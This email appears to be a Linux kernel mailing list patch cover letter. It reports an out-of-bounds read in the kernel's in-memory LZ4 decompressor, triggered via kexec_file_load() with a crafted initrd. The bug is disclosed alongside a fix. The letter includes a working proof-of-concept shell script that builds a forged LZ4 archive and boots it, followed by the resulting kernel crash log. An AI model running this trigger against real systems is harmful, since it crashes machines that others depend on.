Received: from mail-pj1-f53.google.com (mail-pj1-f53.google.com [209.85.216.53])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id EE9D9439341
	for <linux-kernel@vger.kernel.org>; Sat, 12 Sep 2026 13:32:26 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.53
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789219948; cv=none; b=Wn8E0EPAcWPrrdG1BRq7GNBPSzq8yedvAFN8smSBfEQI2583J0eam8ObeQ7JnjK0T7MicxmInMuWBRwbFn0oADGy9f72CdDe5E+pfZFrmNHK7NFMGLsPnSRzppir32+UrHJ0GXYIGnCiN8l/KAwUUgG2MkjahQUZxXRzNuJnHlg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789219948; c=relaxed/simple;
	bh=Lmz3zJ1FpOT6mGRZivWUPdtl7kI5OMwimH5A+rRHR+w=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=bZaYgFzuAl8+iVOkdGGxRjAXb4M9rxQSe4rBTDEbCDV2WCL0Yzt0qRFmw4MBsszyQBKw+qdjv4GmS4wAO9d0rwLoCTfzR3GPgZyIEEDi/tW6xjW6Tp9dTJLYWyyAaFFoEG1b/+VtxcJwJqepQHGmVmIOSAH4/NcMMLz++wrd9rw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=HfwFyDw3; arc=none smtp.client-ip=209.85.216.53
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="HfwFyDw3"
Received: by mail-pj1-f53.google.com with SMTP id 98e67ed59e1d1-398a5aad413so1890450a91.3
        for <linux-kernel@vger.kernel.org>; Sat, 12 Sep 2026 06:32:26 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789219946; x=1789824746; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=khEblxrBQUb73kG/50/bWskH8/rqTxxDlsD6uTjuxGo=;
        b=HfwFyDw3Djd9ARKRxd0E1/p7urUabTCjubiHKqEa8GVvLwa6wB59sdHLGydCG3rJoX
         bOrzb5qIbq5xuMaqg0XonNnMm8h7Vho3ff+Ky3lu0ubQ9gnzgMXCi+BIgwEWBrRIXzDT
         c7h6WGQVgYKT4vqxAcae3o4wRaiKNXw0ak3ZUJUIZ7lV+2yQSH7IwgFVynHqjPESbHYF
         C7I7VD2mito/VPM4B2WgZ6+gWulD1NehggW793/i2tnuk0y/KtYOlWPzi8MbKELIQs/K
         YDTI5NlyrIV75yC+KD5GjAcvGkZ5pcRDBz26RWmsBk/u9Xm6PYbCmMFmZtflCslHWxeN
         rPww==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1789219946; x=1789824746;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=khEblxrBQUb73kG/50/bWskH8/rqTxxDlsD6uTjuxGo=;
        b=lrFA5q8RtOJdHZC3AIEBOQSvWfrRGTLzwri+SRyUSz2IZXhNyZm4Zqd9q0IG3SDAaC
         sW8PRnekQzXb+8AAneoPsypb0K9FrxAzkJ/tO4BKYymdj+2S+lwfWlV+ayIyg7YVZd3N
         Z+6qUM0uMk4gTn4gnYpO6fc4hHT1XExUzNZrGiBE/r4cH7tkJ+blfhOkDzRP6qu59V4p
         PH3ISfub7O2QxmsVVDmAoqSysdUhR6UN508oK3d9WH+rWRXvttdV4/cEp6WqRGgsxv71
         xopZv8TUlLcxWnGWeE70pDXnQ60QRet+tMHC7wUGY3WZneiFBkVqQCYbhbA2nKRkn/g9
         Zjig==
X-Gm-Message-State: AFuF++nsEIXVHwbyvThP9ZUfAg28LdzzNP3Hu5DZk/8MNfg0fvzl2C5W
	qfM3436QLvAvIOfiJqbOGc67CNUDuELAMdqAs1SrdPRKTo+4cT9A08Gep2YMBm2aqE/maddLbhE
	W35cGr+jv5CY=
X-Gm-Gg: AYBFou0gQLG+jhTgFWO+Z25zIm+it8VQbjpbjH2LxzhJKGl9WoHn5ioTJyaLxpHWX/c
	Crk6ABgdoINuVOA1eqeFPwGR8XFraRo5a3+DxSMljNVO6MHLqwrXcNbhGFbdn8LH0M7yN31563M
	+d88us7oeMcJY9WfnjQrGBNqhdE3h8Joy8wktXYyzn4mhxqZBpnGcZVRmXlWg2b6KeQQKDrwOpi
	knnqyOuNOo3UovvXGFUb/iTcjv5Z+t12Odc9zaXWpopWU8jhbKIvO3b5buJYEuDvYJq2nS9iOcQ
	6eLgayLDiMBypL14xqmlsaS034Tk4XuzA71rEiHxH9EM8eS/nHxxK6Xi5wqNIcEld9IqcTH009r
	/hXTDUBkqBSJdu0aKGsUJJifEy1VpQLD8P0HfbgZQWx/JAQuaBmBTboZw2kvua9Amjy0Sgxo/mH
	g6j2dAXOysrbPTxSTk0W3mGW2zLpDuEsDJdFD6YokfcNmYJyDp34VhJKCYB3/Dtoo0qojPHcgu8
	rmmBjUv
X-Received: by 2002:a17:90b:384f:b0:39d:8794:5564 with SMTP id 98e67ed59e1d1-39d9c1c016bmr15479929a91.12.1789219945928;
        Sat, 12 Sep 2026 06:32:25 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-143659a9a06sm13292002c88.0.2026.09.12.06.32.23
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 12 Sep 2026 06:32:25 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: linux-kernel@vger.kernel.org
Cc: akpm@linux-foundation.org,
	kyungsik.lee@lge.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH 0/1] lib: validate in-memory LZ4 chunk length
Date: Sat, 12 Sep 2026 21:32:16 +0800
Message-ID: <cover.1789219453.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in lib/decompress_unlz4.c. The bug is
reachable by a root user through kexec_file_load() with a crafted
external initrd.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

When fill is NULL, unlz4() reads a 32-bit chunk length, advances the
input pointer, and subtracts four bytes from the remaining input size.
It then passes the unvalidated chunk length to LZ4_decompress_safe().
A forged length larger than the remaining archive makes the decoder
read past the mapped initrd while parsing the compressed block.

The in-memory path is used while unpacking an external initrd during
boot. The PoC creates a valid LZ4 legacy archive header followed by a
forged chunk length and a small payload, loads it with kexec_file_load(),
and executes the second kernel. The async initramfs unpack then crashes
in LZ4_decompress_safe().

Reproducer:

    chmod +x poc.sh
    ./poc.sh /root/bzImage

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

    #!/bin/sh
    set -eu

    if [ "$(id -u)" -ne 0 ]; then
    	echo "run as root" >&2
    	exit 1
    fi

    KERNEL_IMAGE="${1:-/root/bzImage}"
    BAD_INITRD="${2:-/root/bad_unlz4.lz4}"

    if [ ! -r "$KERNEL_IMAGE" ]; then
    	echo "kernel image not found: $KERNEL_IMAGE" >&2
    	exit 1
    fi

    python3 - "$BAD_INITRD" <<'PY'
    import struct
    import sys

    path = sys.argv[1]
    magic = 0x184C2102
    chunk = 0x07FFF000
    payload = b"\xF0" + (b"\xFF" * 4096)

    with open(path, "wb") as f:
        f.write(struct.pack("<I", magic))
        f.write(struct.pack("<I", chunk))
        f.write(payload)
    PY

    CMDLINE='root=/dev/sda rw console=ttyS0 net.ifnames=0 biosdevname=0 panic_on_warn=1 oops=panic panic=-1 slub_debug=FZPU nokaslr slab_nomerge numa=off page_poison=1 init_on_alloc=0 init_on_free=0 quiet loglevel=7 systemd.show_status=false'

    /usr/sbin/kexec -u >/dev/null 2>&1 || true
    /usr/sbin/kexec -s -l "$KERNEL_IMAGE" --initrd="$BAD_INITRD" --command-line="$CMDLINE"
    sync
    /usr/sbin/kexec -e

------END poc.sh--------

----BEGIN crash log----

[    4.234226][   T46] Trying to unpack rootfs image as initramfs...
[    4.252106][   T46] BUG: unable to handle page fault for address: ffffed1028000000
[    4.252496][   T46] #PF: supervisor read access in kernel mode
[    4.252496][   T46] #PF: error_code(0x0000) - not-present page
[    4.252496][   T46] PGD 13ffec067 P4D 13ffec067 PUD 13ffeb067 PMD 0
[    4.252496][   T46] Oops: Oops: 0000 [#1] SMP KASAN NOPTI
[    4.252496][   T46] CPU: 2 UID: 0 PID: 46 Comm: kworker/u16:1 Not tainted 6.12.95 #4 53deed68f5e8c87eac9412ec2ca16e6c37d9fe62
[    4.252496][   T46] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[    4.252496][   T46] Workqueue: async async_run_entry_fn
[    4.252496][   T46] RIP: 0010:LZ4_decompress_safe+0x4a5/0x14c0
[    4.252496][   T46] Code: 00 fc ff df 48 89 d8 48 89 df 48 c1 e8 03 83 e7 07 0f b6 34 28 48 8d 43 07 48 89 c2 48 c1 ea 03 40 38 fe 40 0f 9e c7 40 84 f6 <0f> b6 14 2a 40 0f 95 c6 40 84 f7 0f 85 64 0a 00 00 83 e0 07 38 c2
[    4.252496][   T46] RSP: 0018:ffffc900003279e0 EFLAGS: 00010246
[    4.252496][   T46] RAX: ffff888140000001 RBX: ffff88813ffffffa RCX: ffff8881400f7019
[    4.252496][   T46] RDX: 1ffff11028000000 RSI: 0000000000000000 RDI: 0000000000000001
[    4.252496][   T46] RBP: dffffc0000000000 R08: ffffc90001401000 R09: 0000000000000000
[    4.252496][   T46] R10: 00000000000000f0 R11: ffff888147ff6008 R12: ffffc9000150000f
[    4.252496][   T46] R13: ffffc90001c01000 R14: ffff888147ff6008 R15: ffffc90001408ff0
[    4.252496][   T46] FS:  0000000000000000(0000) GS:ffff88810f400000(0000) knlGS:0000000000000000
[    4.252496][   T46] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.252496][   T46] CR2: ffffed1028000000 CR3: 000000013b534001 CR4: 0000000000770ef0
[    4.252496][   T46] PKRU: 55555554
[    4.252496][   T46] Call Trace:
[    4.252496][   T46]  <TASK>
[    4.252496][   T46]  ? unlz4+0x382/0x660
[    4.252496][   T46]  ? srso_alias_return_thunk+0x5/0xfbef5
[    4.252496][   T46]  ? vmalloc_noprof+0xb4/0x100
[    4.252496][   T46]  unlz4+0x23d/0x660
[    4.252496][   T46]  ? __pfx_flush_buffer+0x10/0x10
[    4.252496][   T46]  ? srso_alias_return_thunk+0x5/0xfbef5
[    4.252496][   T46]  unpack_to_rootfs+0x23c/0x730
[    4.252496][   T46]  ? __pfx_error+0x10/0x10
[    4.252496][   T46]  ? __pfx_unpack_to_rootfs+0x10/0x10
[    4.252496][   T46]  ? srso_alias_return_thunk+0x5/0xfbef5
[    4.252496][   T46]  ? __pfx__printk+0x10/0x10
[    4.252496][   T46]  ? srso_alias_return_thunk+0x5/0xfbef5
[    4.252496][   T46]  ? lock_release+0x687/0xc90
[    4.252496][   T46]  ? __pfx_do_populate_rootfs+0x10/0x10
[    4.252496][   T46]  ? do_populate_rootfs+0x34b/0x6c0
[    4.252496][   T46]  ? srso_alias_return_thunk+0x5/0xfbef5
[    4.252496][   T46]  do_populate_rootfs+0x34b/0x6c0
[    4.252496][   T46]  ? ktime_get+0x32/0x150
[    4.252496][   T46]  ? __pfx_do_populate_rootfs+0x10/0x10
[    4.252496][   T46]  ? srso_alias_return_thunk+0x5/0xfbef5
[    4.252496][   T46]  ? trace_hardirqs_on+0x5b/0x110
[    4.252496][   T46]  ? srso_alias_return_thunk+0x5/0xfbef5
[    4.252496][   T46]  ? srso_alias_return_thunk+0x5/0xfbef5
[    4.252496][   T46]  ? srso_alias_return_thunk+0x5/0xfbef5
[    4.252496][   T46]  ? __pfx_do_populate_rootfs+0x10/0x10
[    4.252496][   T46]  async_run_entry_fn+0x9f/0x510
[    4.252496][   T46]  process_one_work+0x80f/0x1680
[    4.252496][   T46]  ? worker_thread+0x275/0x1140
[    4.252496][   T46]  ? __pfx_process_one_work+0x10/0x10
[    4.252496][   T46]  ? lock_acquired+0x374/0xb30
[    4.252496][   T46]  ? lock_is_held_type+0x9a/0x110
[    4.252496][   T46]  ? srso_alias_return_thunk+0x5/0xfbef5
[    4.252496][   T46]  worker_thread+0x618/0x1140
[    4.252496][   T46]  ? __pfx_worker_thread+0x10/0x10
[    4.252496][   T46]  kthread+0x2bd/0x3a0
[    4.252496][   T46]  ? __pfx_kthread+0x10/0x10
[    4.252496][   T46]  ? __pfx_kthread+0x10/0x10
[    4.252496][   T46]  ret_from_fork+0x31/0x70
[    4.252496][   T46]  ? __pfx_kthread+0x10/0x10
[    4.252496][   T46]  ret_from_fork_asm+0x1a/0x30
[    4.252496][   T46]  </TASK>
[    4.252496][   T46] Modules linked in:
[    4.252496][   T46] CR2: ffffed1028000000
[    4.252496][   T46] ---[ end trace 0000000000000000 ]---
[    4.252496][   T46] RIP: 0010:LZ4_decompress_safe+0x4a5/0x14c0
[    4.252496][   T46] Code: 00 fc ff df 48 89 d8 48 89 df 48 c1 e8 03 83 e7 07 0f b6 34 28 48 8d 43 07 48 89 c2 48 c1 ea 03 40 38 fe 40 0f 9e c7 40 84 f6 <0f> b6 14 2a 40 0f 95 c6 40 84 f7 0f 85 64 0a 00 00 83 e0 07 38 c2
[    4.252496][   T46] RSP: 0018:ffffc900003279e0 EFLAGS: 00010246
[    4.252496][   T46] RAX: ffff888140000001 RBX: ffff88813ffffffa RCX: ffff8881400f7019
[    4.252496][   T46] RDX: 1ffff11028000000 RSI: 0000000000000000 RDI: 0000000000000001
[    4.252496][   T46] RBP: dffffc0000000000 R08: ffffc90001401000 R09: 0000000000000000
[    4.252496][   T46] R10: 00000000000000f0 R11: ffff888147ff6008 R12: ffffc9000150000f
[    4.252496][   T46] R13: ffffc90001c01000 R14: ffff888147ff6008 R15: ffffc90001408ff0
[    4.252496][   T46] FS:  0000000000000000(0000) GS:ffff88810f400000(0000) knlGS:0000000000000000
[    4.252496][   T46] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    4.252496][   T46] CR2: ffffed1028000000 CR3: 000000013b534001 CR4: 0000000000770ef0
[    4.252496][   T46] PKRU: 55555554
[    4.252496][   T46] Kernel panic - not syncing: Fatal exception

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  lib: validate in-memory LZ4 chunk length

 lib/decompress_unlz4.c | 4 ++++
 1 file changed, 4 insertions(+)

-- 
2.43.0

